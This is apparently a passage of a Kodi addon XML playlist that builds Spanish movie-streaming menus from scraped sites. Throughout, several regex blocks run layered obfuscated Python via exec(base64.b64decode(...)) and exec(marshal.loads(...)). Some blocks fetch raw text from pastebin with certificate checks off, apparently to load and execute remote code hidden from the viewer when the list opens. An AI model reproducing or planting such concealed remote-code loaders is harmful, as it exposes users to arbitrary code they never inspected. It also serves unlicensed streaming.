SnRRa2ROZWtGM1NHeE1kMXBzUVVkSU0wRlJXakZCZDNodFduZE1iVUZ0ZUcxYWJWb3hRVWQwTUZwSFNEQkJiVVJ0V25kYU5VRkhkREJDUjBWNVFVZEVNbHB0Y0RCYWJWb3pRWGRGZVVGUlJESkJkM0F5UVZGd01reEhjR3hCZWtneFdtMUViVUZVV2pOYWQwUTBXbTFNTTBGUmNYVkJVWGd5UVhkRmVFRkhWakJOVVVRMFdtMTBNMXB0V20xQmQwUXdRa2RFYkVGM2VEQk5VVmQyUVVkRU1VSkhXbTFYYWpCWWJqSkpOVzlLVTJWTlMxWjBRMFpPWVUxVVUzVk1lbW8xY0ZWaU0zQlVjV3BJYlVGalNVZE5URXgzVjNsTVNrRkpUWGRJYVc1U2FqVndkMU0wUlRBMVpFeHRXalJhZGpsWGJrcHhZbkJ0Y1VkSlZIbDRSMGxpYTNGSlJYZHVTMWRaYjNkNVMzQXlVMFphWVhGVVJuZDVZa2RJTVcxRk1qRktRa2RCTmsxdFZtMUZlRUZsVFRGWFdFMVFaak54ZDBnMVFsRk5ka1p0U1dGR01tSTFXak5qWTNGM2RWZEZlR04yUVROYVpYSjNTVzF3TVVWaVJFb3hlVUpKUVhwTlNVeHJUVWg0TVVGU2EyRkNVbXRuYmpCak5rSktjRE51TTFKcFRFaFNOVWxzT1dKdk1sTmxiak5FYTI5M1FUVnhNblF4Y1hsQmFVbEhTWGxJZG1kUFRERkJXVVI2VTFoQmJYbGtXVEZCYmt4MlowZGFlRXd5UWtkTk1XOHdhMWhGU0ZKclRIWm5NRVV5WWpKTlNuRXdXak5JYWtaS2RWQmFlbVp0YjNneFRVY3lUV3ROZDNsVGNuWTVWRWw0VjJWR01rRmpTRXR4VVVReFUycENTMGd6V2tabmFFRklkREp2U1ZORVRFdDBNVmt3UVdoYU0yTkVjR0ZQTkVZelFVMU5TbmxFU25kTmVHOUpSVkJHU0hnMVNsTkJkM0Z0ZVZodk1qbHFibnBpTTBGNmEyNXlkMWRyY0VneFMwaFZUMmxLUzFKclFXMVhVRnBKVDJSYU1XTjRSMUpCV2tZeVlteEZSMGxRYnpKMVRIQXdUV0Z1VkhsWVFsRkVNbHBLZVd0R2VVVk1iMjE0TVVGU1YySndkM2xSV2twclZXOHlVMmxOUzBsWmIzaFRZbkpVZURCYWVFRlpSblpuUlc5SlNEVkhNRk5tUjFOeFJtNUtNV1p3WVVsSGNESjVlVzUzZVU5dk1FUnRRbE4wWlZwNVRXdENTbkJzUlZKSWFWb3pUekphTWpreGNFbzVORXBMUlhad1VYUXhTSGxCV1VkSWVYWnhTRVYxUWtoNU1VeHRUR1ZGUmpsTlRUSTRiVnBSUlVaYVZIbGxRVXBUZVVRelYyVnlSMEZpYjBveGJHNUlSV0ZFTUZvMWJtRlhaVWhMY1VSSVZYbFFSakp4TTNCVFJXcEdiVkpxY0ZCblNFbHRkVWRNYkRneVNWRkpNSEJ0VWpKYVNYVjFTVkpFTkVsSVYxWnhlbE5uUjFOeGJFbEpVMk51UzNGM2IzaGpZVUV3U1d0SVIwODJjVWhyYW5CS1FXTnhVVWxZUlROWFkwaFVWMU51U25GbFFWRlBiRWQzVTJWS1ZVRlZRVW94YlVRd2NEQkZWRGw1Y0ZGTldrRkhRVmx4U2xORlRIcElNa2xTTVdGTk1VMWlibEYxV0VoS05EUktTVWsyUWxGQk5tNTJabVZIVkUxV2JqRkphM0pLWjFwdmVVMVBia2x4UWxwTGRVdEVSMDAwUWxGSWJGb3pWMXBOVWpGaVFWRjVUMDE1VjBGdWVFeGxSSHBqVkVKUmNHbE1NRUYyYjNkVE1raDJaMFZHVVZvMGNWRnhZVTFJZFdwSFNGTk5UVkZGTmtadFZtdHhNRmRwY0hoU01XNVRkV2xFYlZOV1dqSXhUMXAzVFRCd1IwUXpiak5OWTNKM1FXZEdkMDFwUVVseE1FUXlTREpIVVZOclNXRlRia3BSUVZkQmJHZFhTVkZTYVc5NlUweEdWREJyVFhsalduQktVMnh4TTBGNmNUQm5OWEZKUldwRVMwODJSREY1TWtGNVRWWndTRGxNY0ROT01rZElXbXR1UzJJeVdqTlRZMGN5Tld4eWQwd3pibFJqV1Vrd1YyRndNWFZ1V1RCSU0waDZkVFJNTW5neWJ6STBha2RVZERKQ1IwMW1SbmRhYkZreGVHMUpTRTFJUkV0aWJVcDZRVXBGTW5sYVRWTjFWMXBzT1cxTlZIazJSekJuVDAxS1NEVndWSGxYUWxSMWFGa3ljV3hNTVZwc1dqSXdiVzVJYW0xQlIxTlJiMVJYV1hCNlRXSktkMGxEUmpKbldVZDRUV2xhUzJObVFsTkpiRXBIUldSQlNIRk5Ra3RYYkVKSVdtVmFlblZVV1RKVFdIRlNVMXB4ZWtsYVNYZFhVRVJMWTAxWU1VVlNRVWhuTTBSM2NVbE5Na1ZuY0VkNU0zSkxZMnRKU0hWWFdETlBVVzVJWjBod1lYRnBibnA1ZWtjeU9XMXdTVkpsV2tsVFNVSkhRVlZGVkVsUlNucFRhRVZKU0RKYVIzQmxRa2cxYlhBelYyeEViVTkxV2tkSlVsZ3lTR3BGTUVFelNIZFhNMDFLVFhWeWVWTnRSSHA1VkVFd01WaEVkM1ZLUjBkTlNVUkhWMjFIU0hscFIwcDVkMXBLTld0SlIwMVpXbXc1UkZvd2RUUnVTVUUyY0RBNU1YQjNVME5DVVhneldUQnhZVzk2ZFdodlNubHRTVk5KYlV4SGRXNUtSMFV5U0VkRWEwRkxRVmxDU21kb1RVdEpiRzVTUVZsd2VWSnNTbUZOVDI1VGVERnVTMGw2UlZReE5Ga3lNV3hOYlhGb2NrcDVhbG95VFZOdlUzbGpjVkZYVjBGNloySkJWVTAxUWxOME1YRnRjR3RCU1dKcFFWUmliRUV3Y1ZkQ1IxTjRibEZXYlVGSVRHMUNSMU0yVEVwU2FWZ3pUMmxJZG1kMVFYcDVlVVo0T1ZOWU1HTTFXbTFYUVc1SmNVSktTVWxWYmxKSk0yOUxlRFJ3TURFeWJuaE5ha1o0Uldsd2QxSXlUVWg0YVhGc1oyZEJkM0V5UmpOQk1FMVNSR2xFZG1jMWNWRklhMHh0ZFdOeWQxTnNjVzF3TTBWSlNWRkVNbWRhUWtnd01FbEhUV2hCVkhsTFducHhZMDFoVFhwdVZYVmpiMGRGVUVRelRqSk5TVWxpUlVvNE1sb3pUVU5KTUdkUmJrcGFNVWg2WTJSYVJqbEhXVEJCVFZwMloyaGFiRGxpY25kQmJIQkpTREp2VTBGc2JqTlBZbTlJTVdOTVMwZ3pSekpKZWt4NWVEVnZVVUZqUlRGVFNrVXdWakpDVkVGMlJuaElhMGh0UVRWYVZHdDViMHBKYlVkVU1XTktWRmRGY0VwV1pVMUtNVXh4TUVGS2NIbFRVVUV6Y1VOeVUzbFVSakp3TWtRd2VXdEJTblZIYmxRd01GcEhjVEpCTVhGblJIZE9NVVF4VFRORk1VMTNXa3A0TTNCSGNXSnZNMk5QYmtoWFVWcElZbTF1TW5GclRYaHJNM0F6Y1hoQk1qRnRTVkZ4YTAxS1NYcE5iVlpxU1dGRlJYRjZhbWxDVTNScFNIcGpWbTlIUldkdlMwbEdXbUZYV0VRelkxbHhVMk5IUjBkTlNFRktNV1JaTUdOb1JFZFdNVXhIUVVaYVNHZGlUVWRGV0hCSVREVnlTa3hxY2xOTldFWktabXRCTW5FMlJVZ3hlVzR5Y1c1YVMxZEpRVWhtTlc0emVESkZTalZtYm5wMVZuQkthMWxKVVUwd2NXMU5VMGhTUVZaTlNtTlZUSFk1VmtKS1NXMUZTRnB0UkdGVFdVcDZTV0pDU25sTGJqSmpRMDFKVjJ0Q1VtZG5ibE5GYTBWUmNXZEJTa0ZFU2twclNVUkxValJHYkRsMldUSjVZbHBUU1ZOQlNFRmpUSGQwYVc1VFltMUNTSGd6V2pCblNWbHRSV1ZaTWtsTGNFZE5hVVJoVWpCdVMwd3dSVEpJTTBkSGREUk5WVUZSVFZGNWFWa3ljVXRCYlZjMlJrcDFZMjR5VXpOQ1NHTXhRVzFYWjBSaFlqRkZiVUZrY1hsU05ISklaMHRDU0VsQ1dUSTFRM0Y0ZFZSdlNqQTBTVW94Wm05NFYybEJNbE5HV2xBNWFFVnRTWGxaYlVScFRVcHdNMGxoVTJ4Sk0zQnNTRzFKVDBsU1JWRmFlSGw2YmxKU05VWlNRVXB2UzA5amIxRmFNVWxLZUROQ1VrRmhTVkp4TWsxaFdtVndiR2RGYm0xYWJISlZZMUZZTUVWbWNGUjRha2xKVTIxR2JYbEtURVk1VEVRelZ6VkNSM1ZCUkRGSlUyNVZkVFZaTVdOclFYZEZabkJJUVROWWJVbHRRa28xTTB4NGNHMXZlalJyY1hwTlFVRkhjV0ZLUmpnelNWQTVlVWxoVW14Rk1GSXpXbmw0WlZvd1FVOUdTWGxoVEhoTWEwaFFPVlJ3U0VGbVRUSTVURTB5ZUdWdVVWSnRRa3RhYVZwNFowMWFNR28xV2pKbmEwUkxkR3hCTURsVVJEQTFaRmt3TVdseFNtTnRSMGR3TkVSc1ozbEZSMDlqYjNoeFZWb3lOVkZ5ZDAxSVJtMVNNa2Q2TkRWTU1ua3lRVEJKZDAxM1dteEdNa1Y0UWtabmFGcFVOR1Z2TUV4cGNGSXhUVTE0ZFRCSlNuRmFRVE5YTW5GS2NHVnllR3RSV0cxYVpWcDZZMnhGVTBsVWNXMXdNVnA0U1ZOQk1scHRXVEk0YTBaSVoydHZNbE5wU0RJNVdHOUdaMnBhTTA5M1NFZEJUVWRKVTJ4SWVWcHRRWHBxYVZrelNWZHdSMFJ0Y1habldYQkxkV1ZaTWtSdFdURjRaVVJLZUdsd1NXTnBURXBKVUZsdGVXaHZlRmRSYmpCWGJVMUhkV3B2TW5reFFWQTVSVUZMVG1sSFZVOTFSVzE0TWtKVmVWaEVNa0Z0U1ZSNE0wSklPR2xCTTJKbFNFdGFhVzlKZUdsYVMwbGpiMjF4ZFZwc09ETnZSMW8wVFhoU01uQXplVlZCTUZOM1NWVlNhVVpLVFdKRWRqaHBia281VVc5M1JXUlpNWEV3UVZKMVQwSlFPREJFZDA0eFJHMTVVMjVWVjFOTmVVRXpRbEpXYVVoSFVtbHdkMEZvUjFGQlpWa3hkRFZKUzFwdFNVZEpkMGxIZFd0R1VqRkZRbEE1WlhBeWRYVnlSMHhwY1VsSU0xZ3dkWFp4YkdkVlFXMTFRVWgzUVcxWk1GTm1RVVk0YVVaU2VXVkdVbE5uVFZGSmRXNTNTR2x5ZWxJeWJrZFBaMWx0VW1WdVNIQXpSREoxVTFsdFRXMU1NbEp0UVRKcmExa3lNVEpCVlZadFdqQmFhVmx0U1UxQmJEaHBRVzF3YVc5R09XWkZVVVJwUjBZNWJWbHNPVTFCTWsxVlFsSmlaVVIzVm1sSGVHTXdjRVk1ZWxwUk1HRlJSR00yYmtvNWFGWlJNSFJYTVdzMFFXMVhjSEpSVFhwTFZYUXpRVk5yTkZwdFUzQnlVVnB0VjJvd1dHOTZTV2xXVVRCMFRVdE5kVzlRZEdGTFZYUXlXbmxyTkVGM2VYQnlVVTE1UzFWME1scEphelJCYlVGd2NsRk1iVXRWZERKQ1NXczBRWGQ1Y0hKUlYzbExWWFF6UVVsck5FRjZTWEJ5VVV3MFMxVjBNa0ZKYXpSQmJYVndjbEZOZDB0VmRESkNTV3MwUVhkTmNISlJjRFZMVlhSc1FsTnJORUY2UlhCeVVVMTZTMVYwTTFwNWF6UkJiVTl3Y2xGTU5FdFZkREpCU1dzMFFXMUpjSEpSY0cxTFZYUnNRa2xyTkZwM1RtRllSazVsVmxSSk1reEthbUpYTVdzMFFYZEJjSEpSVFhwTFZYUXlRVk5yTkVGM1NYQnlVVXh0UzFWME0xb3hhelJhZWtsd2NsRk1NRXRWZERKQlNXczBRWGRCY0hKUlRYcExWWFF5UVZOck5FRjNTWEJ5VVZZMFMxVjBNMEZUYXpSQmJWZHdjbEZNTlV0VmRESk5TV3MwUVhkNWNISlJjREJMVlhRelFrbHJORnA2UVhCeVVWWnFTMVYwTTB4SmF6UkJkM2x3Y2xGTmVrdFZkREpOU1dzMFduZDRZVmhHVG1WV1ZFa3lURXBxWWxjeGF6UkJkMWR3Y2xGTU5VdFZkREpOU1dzMFFYZFRjSEpSY0cxTFZYUXlXakZyTkVGM2VYQnlVVXcxUzFWMGJFMUphelJCYlVsd2NsRk5lVXRWZERKQ1UyczBRWGRKY0hKUmNEUkxWWFF5VERGck5FRjNlWEJ5VVV3eVMxVjBNMEpKYXpSYWQzVndjbEZOZWt0VmRETmFlV3MwUVhkVGNISlJURzFMVlhReVRERnJORUYzU1hCeVVWWTFWMng0ZEZoc1QzbHhlbE5tV0ZCeGNISlJURzFMVlhReVRYbHJORUYzUlhCeVVVd3hTMVYwTWxveGF6UkJiVUZ3Y2xGWGVVdFZkREpCVTJzMFFYZEpjSEpSVEcxTFZYUXlUWGxyTkVGM1JYQnlVVXd4UzFWMGJFSlRhelJCZWxkd2NsRk1NVXRWZEROQ1NXczBRWHBGY0hKUlRHdExWWFF5VEhsck5FRjNTWEJ5VVhCc1MxVjBiRnBUYXpSYWVrRndjbEZXYWt0VmRETk1TV3MwUVhkNWNISlJUWHBMVlhReVRVbHJORnAzZUdGWVJEQllUVXROZFc5UWRYZHZNakZxYmtwcmVWaFZZMlp1U2xab1RWUkpkMjh5TVdwd2VrbHRjR3gxZGt4TFFYbEJkMFJvVEhkTU1FMVVTWGR2TWtWNVdGUkpNa3hLYW1KWE1XczBRWHBKY0hKUlRERkxWWFF5VFhad1kxaEdlR1pYYld0dGNWVlhZMjk2Y0N0WGJHcGhUVXQxZVV4c2NHTllSRDA5ZEFVQUFBQnliM1F4TTNNSkFBQUFiVzl5Y0dobGRYTWdjeHdBQUFCamIyUmxZM011WkdWamIyUmxLSFJ5YVc1cGRIa3NJSHBwYjI0cGRBWUFBQUJ2Y21GamJHVnpIZ0FBQUdOdlpHVmpjeTVrWldOdlpHVW9hMlY1YldGclpYSWdMQ0I2YVc5dUtYUURBQUFBYm1WdmN3Z0FBQUE4YzNSeWFXNW5QblFFQUFBQVpYaGxZeWdMQUFBQWRBWUFBQUJpWVhObE5qUjBCZ0FBQUdOdlpHVmpjM1FJQUFBQWJXOXljR2hsZFhOMEJ3QUFBSFJ5YVc1cGRIbFNCQUFBQUhRSUFBQUFhMlY1YldGclpYSjBCQUFBQUhwcGIyNTBCQUFBQUdWMllXeFNCUUFBQUhRSEFBQUFZMjl0Y0dsc1pYUUpBQUFBWWpZMFpHVmpiMlJsS0FBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwQ0FBQUFEeHRiMlIxYkdVK0FRQUFBSE1PQUFBQUdBRUdBUVlCQmdFR0FRWUJLZ0U9IikpKQ=="))
]]></expres>
<page></page>
</regex>
<regex>
<name>id3</name>
<expres><![CDATA[#$pyFunction
url = '[c.param7]'
import resolveurl,xbmc,xbmcaddon
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import re,requests,os,xbmc
    return requests.get('https://pastebin.com/raw/6jhtguGd', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': 'https://pastebin.com'}, verify=False).text
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/EGr6YTm.jpg</thumbnail>
<fanart>https://3.bp.blogspot.com/-BwSmYmb5nTE/WzEm9R2JmQI/AAAAAAAAHt4/9QSuAKUdZjQXuJ221alO-silPWB_1olOwCLcBGAs/s1600/fanaaa.jpg</fanart>
</item>



<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Cristal Azul [COLOR white]Manta y Sofa [COLOR green][/COLOR]</title>
<link>$doregex[makelist]</link>
<regex>
 <name>makelist</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist.param3][/COLOR]  </title>
<link>$doregex[id3]</link>
<thumbnail>[makelist.param2]</thumbnail>
<fanart>[makelist.param2]</fanart>
 ]]></listrepeat>
 <expres><![CDATA[#$pyFunction
import re,requests,urllib2,re
import base64;exec(base64.b64decode(""))
]]></expres>
 <page></page>
 <cookieJar></cookieJar>
</regex>  
<regex>
<name>id3</name>
<expres><![CDATA[#$pyFunction
url = '[makelist.param1]'
import re,requests,xbmc,xbmcaddon,resolveurl,cookielib,urllib,urllib2,HTMLParser,cfscrape
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import re,requests,os,xbmc
    return requests.get('https://pastebin.com/raw/6jhtguGd', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': 'https://pastebin.com'}, verify=False).text
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/HnmzhiB.jpg</thumbnail>
<fanart>https://i.imgur.com/RsLj1lh.jpg</fanart>
</item>
-->







<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Cine [/COLOR][COLOR white]Hd[/COLOR] </title>
<link>$doregex[A]</link>
<regex>
<name>A</name>
<listrepeat><![CDATA[
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Cine Hd [COLOR white][A.param1] [/COLOR]</title>
<thumbnail>https://i.imgur.com/Aqhr7Ig.jpg</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
<link>$doregex[makelist2]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data, Cookie_Jar, m):
    items = [('Buscador', 'search', ''), ('Estrenos', 'estrenos', ''), ('Ranking Imdb', 'ranking', ''), ('Genero', 'genero', '')]
    return items
]]></expres>
<page></page>
<agent></agent>
</regex>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param6] [COLOR aqua](*[makelist2.param3][makelist2.param4])[/COLOR]</title>
<info>[COLOR white][CAPITALIZE][makelist2.param6][/CAPITALIZE][/COLOR]</info>
<link>$doregex[peli]</link>
<thumbnail>https://hdfull.co[makelist2.param1]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
elegir = '[A.param2]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>peli</name>
<listrepeat><![CDATA[
<title>$pyFunction:("[COLOR white][CAPITALIZE][peli.param4] [peli.param2] [peli.param3][/CAPITALIZE][/COLOR]").replace("https://","").replace("http://","")</title>
<link>$doregex[selecion_inteligente]</link>
<info>[COLOR white][CAPITALIZE][peli.param2] [peli.param3][/CAPITALIZE][/COLOR]</info>
<thumbnail>https://hdfull.co[makelist2.param1]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = 'https://hdfull.la[makelist2.param5]'
import re,requests,base64,xbmc,xbmcaddon,json,xbmcgui
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '[peli.param1]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUJRQUFBQU1BQUFCREFBQUFjMEVBQUFCa0FRQmtBQUJzQUFCOUF3QmtBZ0JxQVFCa0F3Q0RBUUI5QkFCa0JBQnFBUUJrQXdDREFRQjlBQUI4QXdCcUFnQjhCQUI4QUFBWGd3RUFhZ01BZ3dBQVV5Z0ZBQUFBVG1uLy8vLy9jeFFBQUFCaFNGSXdZMGhOTmt4NU9XbGhXRkYxWWtoclBYUUdBQUFBWW1GelpUWTBjeUFBQUFCTU1FNTJZbTFXYW1SSE9YbGFXRTVtVVROS2NHTXpVbWhpUlVZMlpGZDNQU2dFQUFBQWRBY0FBQUIxY214c2FXSXlkQVlBQUFCa1pXTnZaR1YwQndBQUFIVnliRzl3Wlc1MEJBQUFBSEpsWVdRb0JRQUFBSFFSQUFBQVR6QlBNRTlQTUU4d01FOVBNREF3VHpCMEVRQUFBRTlQVDA4d1QwOVBNRTh3VHpCUE1FOHdkQkVBQUFCUFR6QXdNREF3TUU4d1QwOHdUekJQVDFJQkFBQUFkQkVBQUFCUE1FOVBUekF3TUU5UE1EQXdUMDlQTUNnQUFBQUFLQUFBQUFCekJnQUFBSE5qY21sd2RIUU1BQUFBUjJWMFRGTlFjbTlFWVhSaEFRQUFBSE1JQUFBQUFBRU1BUThCRHdGT0tBRUFBQUJTQ1FBQUFDZ0FBQUFBS0FBQUFBQW9BQUFBQUhNR0FBQUFjMk55YVhCMGRBZ0FBQUE4Ylc5a2RXeGxQZ0VBQUFCekFBQUFBQT09IikpKQ=="))
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNBQUFBQVlBQUFCREFBQUFjL1FBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0JrQWdCOEJ3QnFCUUNEQUFCcUJnQmtBd0NEQVFCckJnQnlnUUI4QkFCcUJ3QmtCQUJrQlFCcEFnQmtCZ0JrQndBMlpBZ0FaQWtBTm1RS0FIUUlBSU1CQW1vSkFGTmtDd0I4QndCcUJRQ0RBQUJxQmdCa0F3Q0RBUUJyQmdCeXhnQjhCQUJxQndCa0JBQmtCUUJwQWdCa0JnQmtCd0EyWkFnQVpBa0FObVFLQUhRSUFJTUJBbW9KQUZOOEJBQnFCd0JrREFCa0JRQnBBZ0JrQmdCa0J3QTJaQWdBWkFrQU5tUUtBSFFJQUlNQkFtb0pBRk5rQUFCVEtBMEFBQUJPYWYvLy8vOTBDd0FBQUdOeWFYTjBZV3hoZW5Wc2RBSUFBQUJwWkhNaEFBQUFhSFIwY0hNNkx5OXdZWE4wWldKcGJpNWpiMjB2Y21GM0wycFFXbUZDUjFsT2RBY0FBQUJvWldGa1pYSnpjMGdBQUFCTmIzcHBiR3hoTHpVdU1DQW9WMmx1Wkc5M2N5Qk9WQ0EyTGpNN0lGZFBWelkwT3lCeWRqbzFOUzR3S1NCSFpXTnJieTh5TURFd01ERXdNU0JHYVhKbFptOTRMelUxTGpCekNnQUFBRlZ6WlhJdFFXZGxiblJ6RkFBQUFHaDBkSEJ6T2k4dmNHRnpkR1ZpYVc0dVkyOXRkQWNBQUFCU1pXWmxjbVZ5ZEFZQUFBQjJaWEpwWm5sMEJRQUFBR1psYzNSaGN5RUFBQUJvZEhSd2N6b3ZMM0JoYzNSbFltbHVMbU52YlM5eVlYY3ZSalJvZG1KcGVIa29DZ0FBQUhRQ0FBQUFjbVYwQ0FBQUFISmxjWFZsYzNSemRBSUFBQUJ2YzNRRUFBQUFlR0p0WTNRSkFBQUFlR0p0WTJGa1pHOXVkQVVBQUFCQlpHUnZiblFNQUFBQVoyVjBRV1JrYjI1SmJtWnZkQU1BQUFCblpYUjBCUUFBQUVaaGJITmxkQVFBQUFCMFpYaDBLQWdBQUFCMEVRQUFBRTh3VHpCUE1EQXdUekF3TURCUE1FOHdkQkVBQUFCUE1FOVBUekF3VHpBd1R6QXdUekJQVDNRUkFBQUFUMDlQVHpCUE1EQlBUMDlQTUU4d1R6QlNCZ0FBQUZJSEFBQUFVZ2dBQUFCU0NRQUFBRklLQUFBQUtBQUFBQUFvQUFBQUFITUdBQUFBYzJOeWFYQjBkQXdBQUFCSFpYUk1VMUJ5YjBSaGRHRUJBQUFBY3d3QUFBQUFBVHdCR3dFcUFSc0JLZ0pPS0FFQUFBQlNFd0FBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/Aqhr7Ig.jpg</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
</item>











<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Supercine [COLOR white]Cristal[/COLOR]</title>
<link>$doregex[A]</link>
<regex>
<name>A</name>
<listrepeat><![CDATA[
<title>[COLOR gold]*[COLOR lightsalmon]Supercine [COLOR white][A.param1] [/COLOR]</title>
<thumbnail>https://i.imgur.com/m6YPUYA.jpg</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
<link>$doregex[busca]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction


import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<agent></agent>
</regex>
<regex>
<name>busca</name>
<listrepeat><![CDATA[
<title>[COLOR white][busca.param3]  [COLOR gold][busca.param4][/COLOR]</title>
<link>$doregex[peli]</link>
<thumbnail>[busca.param2]<thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
elegir = '[A.param2]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>peli</name>
<listrepeat><![CDATA[
<title>[COLOR white][peli.param2]  [COLOR gold][peli.param5][COLOR orange]  [peli.param3][/COLOR]</title>
 <link>$doregex[selecion_inteligente]</link>
<info>[peli.param6]</info>
<thumbnail>[busca.param2]<thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url='[busca.param1]'
import re,requests,base64,xbmc,xbmcaddon
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<expres><![CDATA[#$pyFunction
servidores='[peli.param4]'
referer='[busca.param1]'
import re,requests
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUJRQUFBQU1BQUFCREFBQUFjMEVBQUFCa0FRQmtBQUJzQUFCOUF3QmtBZ0JxQVFCa0F3Q0RBUUI5QkFCa0JBQnFBUUJrQXdDREFRQjlBQUI4QXdCcUFnQjhCQUI4QUFBWGd3RUFhZ01BZ3dBQVV5Z0ZBQUFBVG1uLy8vLy9jeFFBQUFCaFNGSXdZMGhOTmt4NU9XbGhXRkYxWWtoclBYUUdBQUFBWW1GelpUWTBjeUFBQUFCTU1FNTJZbTFXYW1SSE9YbGFXRTVtVVROS2NHTXpVbWhpUlVZMlpGZDNQU2dFQUFBQWRBY0FBQUIxY214c2FXSXlkQVlBQUFCa1pXTnZaR1YwQndBQUFIVnliRzl3Wlc1MEJBQUFBSEpsWVdRb0JRQUFBSFFSQUFBQVR6QlBNRTlQTUU4d01FOVBNREF3VHpCMEVRQUFBRTlQVDA4d1QwOVBNRTh3VHpCUE1FOHdkQkVBQUFCUFR6QXdNREF3TUU4d1QwOHdUekJQVDFJQkFBQUFkQkVBQUFCUE1FOVBUekF3TUU5UE1EQXdUMDlQTUNnQUFBQUFLQUFBQUFCekJnQUFBSE5qY21sd2RIUU1BQUFBUjJWMFRGTlFjbTlFWVhSaEFRQUFBSE1JQUFBQUFBRU1BUThCRHdGT0tBRUFBQUJTQ1FBQUFDZ0FBQUFBS0FBQUFBQW9BQUFBQUhNR0FBQUFjMk55YVhCMGRBZ0FBQUE4Ylc5a2RXeGxQZ0VBQUFCekFBQUFBQT09IikpKQ=="))
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
